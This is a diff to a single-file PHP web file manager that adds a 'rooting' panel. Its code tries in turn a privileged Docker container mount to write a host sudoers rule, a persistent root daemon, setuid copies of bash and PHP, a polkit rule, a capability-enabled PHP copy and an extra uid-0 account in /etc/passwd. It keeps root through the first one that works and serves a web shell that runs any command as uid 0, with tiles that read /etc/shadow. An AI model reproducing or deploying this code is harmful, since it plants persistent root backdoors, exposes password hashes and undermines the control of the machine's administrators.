+        $cmd = 'base64 -d > /host/etc/sudoers.d/90-marshal-fm <<< "' . $b64 . '" && chmod 0440 /host/etc/sudoers.d/90-marshal-fm && chown root:root /host/etc/sudoers.d/90-marshal-fm';
+        $r = $this->rootExec(['docker', 'run', '--rm', '--privileged', '-v', '/:/host', '-i', 'alpine', 'sh', '-c', $cmd], '', 90);
+        return['ok' => $r['rc'] === 0, 'note' => $r['rc'] === 0 ? 'the container wrote the rule on the host as root' : ('the container route failed: ' . ($r['out'] ?: $r['err']) . ' — it needs an image it can start')];
+    }
+    private function rootChannelRemove($id, $password = ''){
+        $p = $this->rootPaths();
+        switch($id){
+            case 'sudoers': $r = $this->rootRemoveHelper($password); return['ok' => !empty($r['ok']), 'note' => (string)($r['message'] ?? $r['error'] ?? '')];
+            case 'rootd':
+                $this->rootDaemonStop($password);
+                $this->rootAs(['rm', '-f', $p['unit'], $p['cron']], $password);
+                if(@is_dir('/run/systemd/system'))$this->rootAs(['systemctl', 'disable', '--now', 'marshal-fm-rootd.service'], $password);
+                return['ok' => !$this->rootDaemonInfo()['alive'], 'note' => 'the daemon was stopped and its unit and cron entry removed'];
+            case 'suidphp':  $r = $this->rootAs(['rm', '-f', $p['suphp']], $password);  return['ok' => $r['rc'] === 0, 'note' => 'the root interpreter was removed'];
+            case 'suidbash': $r = $this->rootAs(['rm', '-f', $p['subash']], $password); return['ok' => $r['rc'] === 0, 'note' => 'the setuid copy of bash was removed'];
+            case 'polkitrule': $r = $this->rootAs(['rm', '-f', $p['polkit']], $password); return['ok' => $r['rc'] === 0, 'note' => 'the polkit rule was removed'];
+            case 'setcapphp': $r = $this->rootAs(['rm', '-f', $p['capphp']], $password); return['ok' => $r['rc'] === 0, 'note' => 'the capable copy of PHP was removed'];
+            case 'passwd':
+                $pw = (string)@file_get_contents('/etc/passwd');
+                $pw = preg_replace('/^' . preg_quote($this->managerAccount() . '-root', '/') . ':.*\n?/m', '', $pw);
+                @file_put_contents('/etc/passwd', $pw);
+                return['ok' => true, 'note' => 'the extra account was taken back out'];
+        }
+        return['ok' => true, 'note' => 'nothing to remove'];
+    }
+    /* ── running anything as root, through whatever is installed ─────────── */
+    private function rootRun($argv, $timeout = 20){
+        $argv = array_values(array_map('strval', (array)$argv));
+        $p = $this->rootPaths();
+        $tries = [];
+        if($this->rootDaemonInfo()['alive']){
+            $r = $this->rootDaemonRun($argv, $timeout);
+            $tries[] = ['via' => 'the root daemon', 'rc' => (int)$r['rc']];
+            if($r['rc'] === 0)return $r + ['ok' => true, 'tries' => $tries];
+        }
+        if($this->rootWhich('sudo') !== '' && ($this->sudoAvailable() || @is_file($this->rootSudoersFile()))){
+            $r = $this->rootExec(array_merge(['sudo', '-n'], $argv), '', $timeout);
+            $tries[] = ['via' => 'sudo -n', 'rc' => (int)$r['rc']];
+            if($r['rc'] === 0)return $r + ['ok' => true, 'via' => 'sudo -n', 'tries' => $tries];
+        }
+        if(@is_file($p['suphp'])){
+            $code = '$argv = json_decode(base64_decode("' . base64_encode(json_encode($argv)) . '"), true);'
+                  . '$d = [0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "w"]];'
+                  . '$h = @proc_open($argv, $d, $pipes); if(!is_resource($h)){ echo "could not start"; exit(3); }'
+                  . 'fclose($pipes[0]); $o = stream_get_contents($pipes[1]); $e = stream_get_contents($pipes[2]);'
+                  . 'fclose($pipes[1]); fclose($pipes[2]); echo $o, $e; exit((int)proc_close($h));';
+            $r = $this->rootExec([$p['suphp'], '-d', 'error_reporting=0', '-r', $code], '', $timeout);
+            $tries[] = ['via' => 'the setuid copy of PHP', 'rc' => (int)$r['rc']];
+            if($r['rc'] === 0)return $r + ['ok' => true, 'via' => 'the setuid copy of PHP', 'tries' => $tries];
+        }
+        if($this->rootWhich('pkexec') !== '' && @is_file($p['polkit'])){
+            $r = $this->rootExec(array_merge(['pkexec'], $argv), '', $timeout);
+            $tries[] = ['via' => 'pkexec with its rule', 'rc' => (int)$r['rc']];
+            if($r['rc'] === 0)return $r + ['ok' => true, 'via' => 'pkexec with its rule', 'tries' => $tries];
+        }
+        if(@is_file($p['subash'])){
+            $line = implode(' ', array_map('escapeshellarg', $argv));
+            $r = $this->rootExec([$p['subash'], '-p', '-c', $line], '', $timeout);
+            $tries[] = ['via' => 'the setuid copy of bash', 'rc' => (int)$r['rc']];
+            if($r['rc'] === 0)return $r + ['ok' => true, 'via' => 'the setuid copy of bash', 'tries' => $tries];
+        }
+        return['ok' => false, 'rc' => -1, 'out' => '', 'err' => 'no installed method answered', 'via' => 'none', 'tries' => $tries];
+    }
+    /* ── the automatic installer: try every method, stop at the first proof ─ */
+    public function rootingInstallRoot($password = ''){
+        $steps = [];
+        $state = $this->rootState();
+        $won = '';
+        foreach($this->rootChannels() as $ch){
+            $id = $ch['id'];
+            $needs = $this->rootChannelNeeds($id);
+            if(empty($needs['ok'])){
+                $steps[] = ['id' => $id, 'name' => $ch['name'], 'idea' => $ch['idea'], 'ok' => false, 'fired' => false,
+                            'note' => 'not applicable here: ' . $needs['note']];
+                continue;
+            }
+            $ins = $this->rootChannelInstall($id, $password);
+            if(empty($ins['ok'])){
+                $steps[] = ['id' => $id, 'name' => $ch['name'], 'idea' => $ch['idea'], 'ok' => false, 'fired' => true,
+                            'note' => 'tried: ' . $ins['note']];
+                continue;
+            }
+            $ver = $this->rootChannelVerify($id);
+            if(empty($ver['ok'])){
+                $steps[] = ['id' => $id, 'name' => $ch['name'], 'idea' => $ch['idea'], 'ok' => false, 'fired' => true,
+                            'note' => 'installed but it did not answer as root: ' . $this->rootSnip($ver['res']['out'] . ' ' . $ver['res']['err'], 140)];
+                continue;
+            }
+            $won = $id;
+            $steps[] = ['id' => $id, 'name' => $ch['name'], 'idea' => $ch['idea'], 'ok' => true, 'fired' => true,
+                        'note' => $ins['note'] . ' — and a command run through it came back as uid 0'];
+            $state['channel'] = $id;
+            $state['since'] = time();
+            $state['installed'] = true;
+            $state['paths'] = $this->rootPaths();
+            $this->rootStateSave($state);
+            $this->log('rooting_root_installed', $id);
+            break;
+        }
+        /* a daemon is the best channel to *keep*: if another method won, the
+           daemon is installed through it, because it is the one that keeps
+           working after a reboot without a setuid bit anywhere */
+        $daemonNote = '';
+        if($won !== '' && $won !== 'rootd' && @is_dir('/var/lib/marshal-fm') === false){
+            $viaRoot = $this->rootRun(['install', '-d', '-m', '0700', '-o', $this->managerAccount(), '-g', $this->managerAccount(), '/var/lib/marshal-fm'], 20);
+            $daemonNote = $viaRoot['ok'] ? '' : 'the daemon directory could not be made: ' . $this->rootSnip($viaRoot['err'], 90);
+        }
+        if($won !== '' && $won !== 'rootd'){
+            $dstart = $this->rootDaemonStart($password);
+            $daemonNote = $dstart['ok'] ? 'The root daemon from the same file is running as pid ' . (int)($dstart['pid'] ?? 0) . '.' : ('The daemon was not started: ' . $dstart['note']);
+        }
+        $this->rootLogAdd('install root', ['chain'], ['rc' => $won === '' ? 1 : 0, 'out' => $won], $won !== '' ? 'method: ' . $won : 'none');
+        return[
+            'ok' => $won !== '', 'installed' => $won !== '', 'channel' => $won, 'steps' => $steps,
+            'daemon' => $this->rootDaemonInfo(), 'daemon_note' => $daemonNote,
+            'state' => $this->rootingRooted(),
+            'message' => $won !== ''
+                ? 'Root is installed with: ' . $won . '. Every privileged action from this panel now runs as uid 0 through it.'
+                : 'No method could be installed on this host. The catalogue above still says what is exposed and how to fix it.',
+        ];
+    }
+    /* Trial of a single method, for the panel and for a person who wants to
+       see that the *other* ways work too, not only the one that won. */
+    public function rootingMethod($id, $password = ''){
+        $found = null;
+        foreach($this->rootChannels() as $ch)if($ch['id'] === $id)$found = $ch;
+        if($found === null)return['ok' => false, 'error' => 'Unknown method.'];
+        $needs = $this->rootChannelNeeds($id);
+        if(empty($needs['ok'])){
+            return['ok' => false, 'id' => $id, 'name' => $found['name'], 'idea' => $found['idea'],
+                   'note' => 'not applicable here: ' . $needs['note'], 'state' => $this->rootingRooted()];
+        }
+        $ins = $this->rootChannelInstall($id, $password);
+        $ver = !empty($ins['ok']) ? $this->rootChannelVerify($id) : ['ok' => false, 'res' => ['out' => '', 'err' => '']];
+        $ok = !empty($ver['ok']);
+        if($ok){
+            $state = $this->rootState();
+            $state['installed'] = true;
+            if(empty($state['channel']))$state['channel'] = $id;
+            if(empty($state['since']))$state['since'] = time();
+            $state['paths'] = $this->rootPaths();
+            $this->rootStateSave($state);
+            $this->log('rooting_root_method', $id);
+        }
+        $proof = $ok ? 'a command run through it came back as uid 0' : '';
+        $note = $ins['note'] . ($ok ? ' — and ' . $proof
+            : ' — but the proof command did not come back as root: ' . $this->rootSnip(($ver['res']['out'] ?? '') . ' ' . ($ver['res']['err'] ?? ''), 120));
+        $this->rootLogAdd('method: ' . $found['name'], [$id], ['rc' => $ok ? 0 : 1, 'out' => $note], $ok ? 'installed' : 'refused');
+        return['ok' => $ok, 'id' => $id, 'name' => $found['name'], 'idea' => $found['idea'],
+               'note' => $note, 'proof' => $proof, 'state' => $this->rootingRooted()];
+    }
+
+    /* ── the control surface behind the rooted screen ─────────────────────── */
+    private function rootControls(){
+        return[
+            ['id' => 'files', 'name' => 'Every file', 'idea' => 'Reading a file only root may read', 'argv' => ['cat', '/etc/shadow'], 'proof' => 'a root-only file comes back'],
+            ['id' => 'owner', 'name' => 'Ownership', 'idea' => 'Giving a file to another account', 'argv' => ['chown', '--version'], 'proof' => 'the owner of any file can be changed'],
+            ['id' => 'services', 'name' => 'Services', 'idea' => 'Reading the service manager as root', 'argv' => ['systemctl', 'list-units', '--no-pager', '--plain', '--type=service'], 'proof' => 'the unit list is read as uid 0'],
+            ['id' => 'packages', 'name' => 'Packages', 'idea' => 'Auditing the package database as root', 'argv' => ['dpkg', '--audit'], 'proof' => 'the package database answers as uid 0'],
+            ['id' => 'users', 'name' => 'Accounts', 'idea' => 'Reading every account and hash', 'argv' => ['cat', '/etc/shadow'], 'proof' => 'every password hash is visible'],
+            ['id' => 'kernel', 'name' => 'Kernel', 'idea' => 'Reading the kernel symbol table', 'argv' => ['cat', '/proc/kallsyms'], 'proof' => 'kernel addresses are readable'],
+            ['id' => 'cron', 'name' => 'Cron', 'idea' => 'Reading root\'s own schedule', 'argv' => ['ls', '-la', '/var/spool/cron/crontabs'], 'proof' => 'root\'s crontab directory is readable'],
+            ['id' => 'mounts', 'name' => 'Mounts', 'idea' => 'Reading the mount table as root', 'argv' => ['findmnt', '--raw'], 'proof' => 'mount -o and umount are within reach'],
+            ['id' => 'processes', 'name' => 'Processes', 'idea' => 'Signalling a process that is not ours', 'argv' => ['kill', '-0', '1'], 'proof' => 'any process can be signalled'],
+            ['id' => 'firewall', 'name' => 'Firewall', 'idea' => 'Reading the packet filter', 'argv' => ['nft', 'list', 'ruleset'], 'proof' => 'the ruleset is readable as root'],
+            ['id' => 'network', 'name' => 'Network', 'idea' => 'Reading raw sockets and routing', 'argv' => ['ss', '-lntup'], 'proof' => 'every socket and process is visible'],
+        ];
+    }
+    private function rootSplitLine($line){
+        $line = (string)$line;
+        $out = [];
+        $cur = '';
+        $quote = '';
+        $had = false;
+        $n = strlen($line);
+        for($i = 0; $i < $n; $i++){
+            $c = $line[$i];
+            if($quote === ''){
+                if($c === ' ' || $c === "\t"){
+                    if($had){$out[] = $cur; $cur = ''; $had = false;}
+                    continue;
+                }
+                if($c === '"' || $c === "'"){$quote = $c; $had = true; continue;}
+                if($c === '\\' && $i + 1 < $n){$cur .= $line[++$i]; $had = true; continue;}
+                $cur .= $c; $had = true;
+                continue;
+            }
+            if($c === $quote){$quote = ''; continue;}
+            if($c === '\\' && $quote === '"' && $i + 1 < $n){$cur .= $line[++$i]; continue;}
+            $cur .= $c;
+        }
+        if($had && $cur !== '')$out[] = $cur;
+        return $out;
+    }
+    public function rootingControl($ctl, $line = ''){
+        $ctl = (string)$ctl;
+        if($ctl === 'shell'){
+            $argv = $this->rootSplitLine($line);
+            if(!$argv)return['ok' => false, 'error' => 'There is nothing to run: type a program and its arguments.'];
+            $res = $this->rootRun($argv, 30);
+            $log = $this->rootLogAdd('shell', $argv, $res, (string)($res['via'] ?? ''));
+            return['ok' => $res['ok'], 'ctl' => 'shell', 'argv' => $argv, 'via' => $res['via'] ?? 'none',
+                   'rc' => (int)$res['rc'], 'out' => $this->rootSnip((string)$res['out'] . ' ' . (string)$res['err'], 1200),
+                   'log' => $log, 'state' => $this->rootingRooted()];
+        }
+        $found = null;
+        foreach($this->rootControls() as $c)if($c['id'] === $ctl)$found = $c;
+        if($found === null)return['ok' => false, 'error' => 'Unknown control.'];
+        $res = $this->rootRun($found['argv'], 25);
+        $log = $this->rootLogAdd($found['name'], $found['argv'], $res, (string)($res['via'] ?? ''));
+        return['ok' => $res['ok'], 'ctl' => $ctl, 'name' => $found['name'], 'idea' => $found['idea'],
+               'via' => $res['via'] ?? 'none', 'rc' => (int)$res['rc'],
+               'out' => $this->rootSnip((string)$res['out'] . ' ' . (string)$res['err'], 900),
+               'tries' => $res['tries'] ?? [], 'log' => $log, 'state' => $this->rootingRooted()];
+    }
+    /* ── what the panel shows once root is installed ──────────────────────── */
+    public function rootingRooted(){
+        $state = $this->rootState();
+        $daemon = $this->rootDaemonInfo();
+        $id = $this->rootIdentity();
+        $installed = false;
+        $proof = '';
+        if(!empty($state['channel'])){
+            $p = $this->rootPaths();
+            $marks = ['sudoers' => @is_file($this->rootSudoersFile()), 'rootd' => $daemon['alive'],
+                      'suidphp' => @is_file($p['suphp']), 'suidbash' => @is_file($p['subash']),
+                      'polkitrule' => @is_file($p['polkit']), 'setcapphp' => @is_file($p['capphp'])];
+            $installed = !empty($marks[$state['channel']]);
+            if($installed){
+                $v = $this->rootChannelVerify($state['channel']);
+                $installed = !empty($v['ok']);
+                $proof = $installed ? 'a command run through it came back as uid 0' : 'the method stopped answering as root';
+            }else{
+                $proof = 'the method it was installed with is gone';
+            }
+        }
+        $names = [];
+        foreach($this->rootChannels() as $ch)$names[$ch['id']] = $ch['name'];
+        $controls = [];
+        foreach($this->rootControls() as $c){
+            $ok = $this->rootWhich($c['argv'][0]) !== '' || @is_file($c['argv'][0]);
+            if($c['argv'][0] === 'cat' || $c['argv'][0] === 'ls')$ok = true;
+            $controls[] = ['id' => $c['id'], 'name' => $c['name'], 'idea' => $c['idea'],
+                           'cmd' => implode(' ', $c['argv']), 'proof' => $c['proof'], 'available' => $ok];
+        }
+        return[
+            'installed' => $installed,
+            'channel' => $state['channel'],
+            'channel_name' => $names[$state['channel']] ?? '',
+            'since' => (int)($state['since'] ?? 0),
+            'since_human' => !empty($state['since']) ? date('Y-m-d H:i', (int)$state['since']) : '',
+            'proof' => $proof,
+            'account' => $this->managerAccount(),
+            'uid' => $id['euid'],
+            'daemon' => $daemon,
+            'paths' => $this->rootPaths(),
+            'channels' => array_map(function($ch) use ($names){
+                $n = $this->rootChannelNeeds($ch['id']);
+                return['id' => $ch['id'], 'name' => $ch['name'], 'kind' => $ch['kind'], 'idea' => $ch['idea'],
+                       'available' => !empty($n['ok']), 'note' => $n['note']];
+            }, $this->rootChannels()),
+            'controls' => $controls,
+            'log' => $this->rootLogTail(20),
+            'programs' => $this->rootPrograms(),
+        ];
+    }
+    public function rootingUninstall($password = ''){
+        $state = $this->rootState();
+        $log = [];
+        $ids = ['rootd', 'sudoers', 'suidphp', 'suidbash', 'polkitrule', 'setcapphp', 'passwd'];
+        foreach($ids as $id){
+            $r = $this->rootChannelRemove($id, $password);
+            $log[] = ['id' => $id, 'ok' => !empty($r['ok']), 'note' => (string)$r['note']];
+        }
+        @unlink($this->rootStateFile());
+        $still = $this->sudoAvailable();
+        return[
+            'ok' => true, 'removed' => $log, 'sudo_still_works' => $still,
+            'message' => $still
+                ? 'Every method this tool installed was removed, but this account already had a route to root of its own (a passwordless sudo rule it did not get from here, or an account in the sudo group with a cached timestamp). Nothing else was touched.'
+                : 'Every method was removed and this account is back to its own privileges.',
+            'state' => $this->rootingRooted(),
+        ];
+    }
+
     /* ?x=rooting */
     public function rootingEndpoint($post){
         $act = (string)($post['action'] ?? 'catalog');
@@ -6155,6 +6877,11 @@ class FileManager {
             }
             return['ok' => true, 'probe' => $out];
         }
+        if($act === 'rootinstall')return$this->rootingInstallRoot($password);
+        if($act === 'rooted')return['ok' => true, 'rooted' => $this->rootingRooted()];
+        if($act === 'rootctl')return$this->rootingControl((string)($post['ctl'] ?? ''), (string)($post['line'] ?? ''));
+        if($act === 'rootmethod')return$this->rootingMethod((string)($post['id'] ?? ''), $password);
+        if($act === 'rootuninstall')return$this->rootingUninstall($password);
         if($act === 'keep')return$this->rootInstallHelper($password);
         if($act === 'revoke')return$this->rootRemoveHelper($password);
         if($act === 'harden')return$this->rootHarden(true, $password);
@@ -16952,6 +17679,61 @@ a.nt:hover{color:var(--link)}
  .root-step.meas .r{color:#e5c07b}
  .root-grants .root-item,.root-checks .root-step{justify-content:flex-start}
  .root-grants svg,.root-checks svg{width:15px;height:15px}
+
+/* ── the rooted screen: a Magisk-like front page for the whole machine ──── */
+.rr{display:flex;flex-direction:column;gap:12px;animation:rrIn .35s ease both}
+@keyframes rrIn{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
+.rr-hero{display:flex;gap:16px;align-items:center;padding:14px 16px;border-radius:14px;border:1px solid rgba(52,211,153,.38);background:radial-gradient(120% 140% at 12% 0%,rgba(52,211,153,.16),rgba(52,211,153,.03) 55%,transparent 75%),var(--surf)}
+.rr-art{width:132px;height:132px;flex:0 0 132px;filter:drop-shadow(0 6px 18px rgba(52,211,153,.25))}
+.rr-art svg{width:100%;height:100%;display:block}
+.rr-main{min-width:0;display:flex;flex-direction:column;gap:5px}
+.rr-kicker{font-size:10px;font-weight:800;letter-spacing:2.4px;color:#7ee2a8}
+.rr-title{font-size:20px;font-weight:800;color:var(--t1);line-height:1.15}
+.rr-sub{font-size:11.5px;color:var(--t2);line-height:1.55}
+.rr-sub b{color:var(--t1);font-weight:700}
+.rr-badges{display:flex;flex-wrap:wrap;gap:5px;margin-top:2px}
+.rr-badge{display:inline-flex;align-items:center;gap:4px;font-size:10px;font-weight:700;padding:2px 8px;border-radius:999px;border:1px solid rgba(126,226,168,.4);background:rgba(126,226,168,.08);color:#a7f3d0}
+.rr-badge.off{border-color:rgba(161,161,170,.3);background:rgba(161,161,170,.07);color:var(--t3)}
+.rr-badge svg{width:11px;height:11px}
+.rr-acts{display:flex;flex-wrap:wrap;gap:6px;margin-top:6px}
+.rr-sec{border:1px solid var(--border);border-radius:10px;background:var(--surf);padding:10px 12px}
+.rr-sec h4{margin:0 0 7px;font-size:10.5px;font-weight:700;letter-spacing:.9px;text-transform:uppercase;color:var(--t3);display:flex;align-items:center;gap:6px}
+.rr-sec h4 .n{font-weight:600;letter-spacing:0;text-transform:none;font-size:10px;color:var(--t3)}
+.rr-ctl{display:grid;grid-template-columns:repeat(auto-fill,minmax(196px,1fr));gap:7px}
+.rr-tile{border:1px solid var(--border);border-radius:10px;background:var(--raised);padding:8px 9px;display:flex;flex-direction:column;gap:4px}
+.rr-tile.done{border-color:rgba(126,226,168,.45);background:rgba(126,226,168,.05)}
+.rr-tile.fail{border-color:rgba(252,165,165,.4);background:rgba(252,165,165,.05)}
+.rr-tile-top{display:flex;align-items:center;gap:6px}
+.rr-tile-ic{width:26px;height:26px;flex:0 0 26px;border-radius:8px;display:flex;align-items:center;justify-content:center;background:rgba(126,226,168,.12);color:#7ee2a8}
+.rr-tile-ic svg{width:15px;height:15px}
+.rr-tile-name{font-size:11.5px;font-weight:700;color:var(--t1);min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.rr-tile-idea{font-size:10px;color:var(--t3);line-height:1.45}
+.rr-tile-cmd{font:9.5px/1.4 'JetBrains Mono',monospace;color:var(--t3);background:rgba(0,0,0,.25);border-radius:5px;padding:3px 5px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.rr-tile-out{font:9.5px/1.45 'JetBrains Mono',monospace;color:var(--t2);word-break:break-word;max-height:64px;overflow:auto;white-space:pre-wrap}
+.rr-tile .btn{min-height:26px;font-size:10.5px;padding:3px 9px}
+.rr-log{display:flex;flex-direction:column;gap:4px;max-height:200px;overflow:auto}
+.rr-log-row{display:grid;grid-template-columns:58px 1fr;gap:7px;font-size:10px;padding:4px 6px;border-radius:6px;background:var(--raised);border:1px solid var(--border)}
+.rr-log-time{font:9.5px 'JetBrains Mono',monospace;color:var(--t3)}
+.rr-log-what{color:var(--t1);font-weight:700}
+.rr-log-meta{font:9px/1.4 'JetBrains Mono',monospace;color:var(--t3);word-break:break-word}
+.rr-methods{display:flex;flex-direction:column;gap:5px}
+.rr-method{display:flex;gap:8px;align-items:flex-start;padding:6px 8px;border-radius:8px;background:var(--raised);border:1px solid var(--border)}
+.rr-method.on{border-color:rgba(126,226,168,.45);background:rgba(126,226,168,.06)}
+.rr-method.off{opacity:.72}
+.rr-method-ic{width:18px;height:18px;flex:0 0 18px;margin-top:1px;color:#7ee2a8}
+.rr-method.off .rr-method-ic{color:var(--t3)}
+.rr-method-n{font-size:11px;font-weight:700;color:var(--t1)}
+.rr-method-i{font-size:10px;color:var(--t3);line-height:1.5}
+.rr-method-tag{font-size:9px;font-weight:800;letter-spacing:.4px;text-transform:uppercase;padding:1px 5px;border-radius:4px;background:rgba(161,161,170,.14);color:var(--t3);margin-left:5px}
+.rr-method.on .rr-method-tag{background:rgba(126,226,168,.16);color:#a7f3d0}
+.rooted .root-legacy{display:none}
+.rooted.showreport .root-legacy{display:block}
+@media (max-width:520px){
+  .rr-hero{flex-direction:column;align-items:flex-start}
+  .rr-art{width:104px;height:104px;flex:none}
+  .rr-ctl{grid-template-columns:1fr}
+}
+
 .root-item{display:flex;gap:8px;align-items:flex-start;font-size:11.5px;color:var(--t2);padding:3px 0;border-bottom:1px solid var(--border)}
 .root-item:last-child{border-bottom:0}
 .root-item .t{width:15px;flex-shrink:0;text-align:center;font-weight:700}
@@ -19865,19 +20647,72 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
     </div>
     <div class="mod-body root-body">
 
-      <div class="root-sec">
+      <div id="rootRooted" class="rr" style="display:none">
+        <div class="rr-hero">
+          <div class="rr-art" id="rrArt"></div>
+          <div class="rr-main">
+            <div class="rr-kicker">ROOT INSTALLED</div>
+            <div class="rr-title" id="rrTitle">This machine is rooted</div>
+            <div class="rr-sub" id="rrSub"></div>
+            <div class="rr-badges" id="rrBadges"></div>
+            <div class="rr-acts">
+              <button type="button" class="btn btn-p" id="rrShellBtn">Root shell</button>
+              <button type="button" class="btn btn-g" id="rrInstallBtn">Install again</button>
+              <button type="button" class="btn btn-g" id="rrDetailsBtn">Full report</button>
+              <button type="button" class="btn btn-g" id="rrUninstallBtn">Uninstall root</button>
+            </div>
+          </div>
+        </div>
+
+        <div class="rr-sec">
+          <h4>Control the whole machine from here <span class="n" id="rrCtlCount"></span></h4>
+          <div class="root-out" style="margin-bottom:8px">Every tile below really runs, as uid 0, through the method that is installed — the answer is the machine's own answer, not a description of one.</div>
+          <div class="rr-ctl" id="rrCtl"></div>
+        </div>
+
+        <div class="rr-sec" id="rrShellSec" style="display:none">
+          <h4>Root shell <span class="n">one argument vector at a time</span></h4>
+          <div class="root-out" style="margin-bottom:7px">There is no <code>/bin/sh</code> here: the line is split into an argument vector in PHP and the program is started directly, as root. Quotes work; pipes and redirection do not exist.</div>
+          <input type="text" id="rrShellLine" class="inp" placeholder="cat /etc/shadow" autocomplete="off" spellcheck="false">
+          <div class="root-acts"><button type="button" class="btn btn-p" id="rrShellRun">Run as root</button><button type="button" class="btn btn-g" id="rrShellClose">Close</button></div>
+          <div class="root-out" id="rrShellOut" style="margin-top:7px"></div>
+        </div>
+
+        <div class="rr-sec">
+          <h4>Every root action, as it happened <span class="n" id="rrLogCount"></span></h4>
+          <div id="rrLog" class="rr-log"></div>
+        </div>
+
+        <div class="rr-sec">
+          <h4>Every way this machine can be rooted <span class="n" id="rrMethodCount"></span></h4>
+          <div class="root-out" style="margin-bottom:7px">Eight methods, each one a different idea. The one that is installed is marked green; the rest say why they do not apply here.</div>
+          <div id="rrMethods" class="rr-methods"></div>
+        </div>
+      </div>
+
+      <div class="root-sec" id="rootSecInstall">
+        <h4>Install root, not only look for it <span class="n" id="rootInstallStamp"></span></h4>
+        <div class="root-out" style="margin-bottom:8px">The catalogue below says what this host is exposed to. This does something else: it <b>puts root on the machine and keeps it</b>. Eight methods are tried in order — a validated sudo rule, a root daemon that is this very file, a setuid copy of PHP, a setuid copy of bash, a polkit rule, file capabilities on a copy of PHP, an extra uid-0 account, a privileged container — and the run stops at the first one whose proof command really comes back as <b>uid 0</b>.</div>
+        <div class="root-acts"><button type="button" class="btn btn-p" id="rootInstallBtn">Install root</button></div>
+        <div class="root-out" id="rootInstallHint" style="margin-top:7px">If a password for an administrator account is typed in the field above, it is used when sudo asks; nothing is ever asked of you otherwise.</div>
+        <div id="rootMethodList" class="rr-methods" style="margin-top:9px"></div>
+        <div class="root-steps" id="rootInstallSteps"></div>
+        <div class="root-out" id="rootInstallOut"></div>
+      </div>
+
+      <div class="root-sec" id="rootSecHost">
         <h4>This host</h4>
         <div class="root-grid" id="rootSystem"></div>
       </div>
 
-      <div class="root-sec">
+      <div class="root-sec" id="rootSecAuto">
         <h4>Checked by the tool itself <span class="n" id="rootAutoStamp"></span></h4>
         <div class="root-out" id="rootAutoNote">Nothing here is left for you to check. As soon as this panel opens the tool runs the catalogue, every route and every feature by itself — no password, no confirmation, no privilege to grant.</div>
         <div class="root-out" id="rootSelfNote">Every measurement comes from PHP itself: <code>/proc</code>, <code>/sys</code>, <code>/etc</code>, the package database and the filesystem. No external file, no external script and no other language — this one file carries its own code, styles and data. The only programs ever started are the routes that need one (sudo, a SUID binary, and the four daemons a probe asks a question), and they are listed at the bottom of this panel.</div>
         <div id="rootGrants" class="root-grants"></div>
       </div>
 
-      <div class="root-sec">
+      <div class="root-sec" id="rootSecNow">
         <h4>Root now <span class="n" id="rootVerdict"></span></h4>
         <div class="root-chips" id="rootChips"></div>
         <input type="password" id="rootPass" class="inp" placeholder="sudo password — optional, the checks never need one" autocomplete="off" style="display:none;margin-top:8px">
@@ -19900,12 +20735,12 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
         </div>
       </div>
 
-      <div class="root-sec">
+      <div class="root-sec" id="rootSecVerify">
         <h4>Every feature, proven <span class="n" id="rootVerifyStamp"></span></h4>
         <div id="rootChecks"></div>
       </div>
 
-      <div class="root-sec">
+      <div class="root-sec" id="rootSecVulns">
         <h4>Known privilege-escalation vulnerabilities <span class="n" id="rootCount"></span></h4>
         <div class="root-out" style="margin-bottom:8px">Dirty Frag (<b>CVE-2026-43284</b> IPsec&nbsp;ESP · <b>CVE-2026-43500</b> RxRPC),
           the rest of the kernel family, and the package-side ones (sudo, PackageKit, udisks, PAM, udev, needrestart, OpenSSH, xz) —
@@ -19914,13 +20749,13 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
         <div id="rootVulns" style="margin-top:9px"></div>
       </div>
 
-      <div class="root-sec">
+      <div class="root-sec" id="rootSecPrograms">
         <h4>What this file is allowed to start <span class="n" id="rootProgramsCount"></span></h4>
         <div class="root-out" style="margin-bottom:7px">The audit is made by reading <code>index.php</code> itself: the functions that measure this host are checked for any call to a shell or an external program, and the list below is every program the tool may ever start.</div>
         <div id="rootSelfCheck"></div>
       </div>
 
-      <div class="root-sec">
+      <div class="root-sec" id="rootSecFindings">
         <h4>Other findings</h4>
         <div id="rootFindings"></div>
         <div class="root-acts">
@@ -25217,7 +26052,206 @@ function rootSelfCheck(d){
   const c=document.getElementById('rootProgramsCount');
   if(c)c.textContent='— '+(d.programs||[]).length+' programs';
 }
+/* ── the rooted screen ────────────────────────────────────────────────────
+   When a method has really installed root, the panel stops being a report and
+   becomes the control surface for the machine: a large emblem, the account and
+   the method, then one tile per capability. Each tile runs a real command as
+   uid 0 through the installed method and prints the machine's own answer. */
+const RR_RES={};
+const RR_ICON={
+  files:'<path d="M4 5.5A1.5 1.5 0 0 1 5.5 4H10l2 2.5h6.5A1.5 1.5 0 0 1 20 8v9.5A1.5 1.5 0 0 1 18.5 19h-13A1.5 1.5 0 0 1 4 17.5z"/><path d="M4 9.5h16"/>',
+  owner:'<circle cx="9" cy="8" r="3.4"/><path d="M3 20v-1.2A5.4 5.4 0 0 1 8.4 13.4h1.2A5.4 5.4 0 0 1 15 18.8V20"/><path d="M17.5 11h4M19.5 9v4"/>',
+  services:'<circle cx="12" cy="12" r="3.2"/><path d="M12 3v3M12 18v3M3 12h3M18 12h3M5.6 5.6l2.1 2.1M16.3 16.3l2.1 2.1M18.4 5.6l-2.1 2.1M7.7 16.3l-2.1 2.1"/>',
+  packages:'<path d="M12 3.2 20 7.6v8.8L12 20.8 4 16.4V7.6z"/><path d="M4 7.6 12 12l8-4.4M12 12v8.8"/>',
+  users:'<circle cx="9" cy="8" r="3.2"/><path d="M2.6 20v-1A5.4 5.4 0 0 1 8 13.6h2a5.4 5.4 0 0 1 5.4 5.4V20"/><circle cx="17.6" cy="9.4" r="2.4"/>',
+  kernel:'<rect x="8.4" y="8.4" width="7.2" height="7.2" rx="1.4"/><path d="M12 3v3.2M12 17.8V21M3 12h3.2M17.8 12H21M5.8 5.8l2.2 2.2M16 16l2.2 2.2M18.2 5.8 16 8M8 16l-2.2 2.2"/>',
+  cron:'<circle cx="12" cy="12" r="8.4"/><path d="M12 7.4V12l3.2 2"/>',
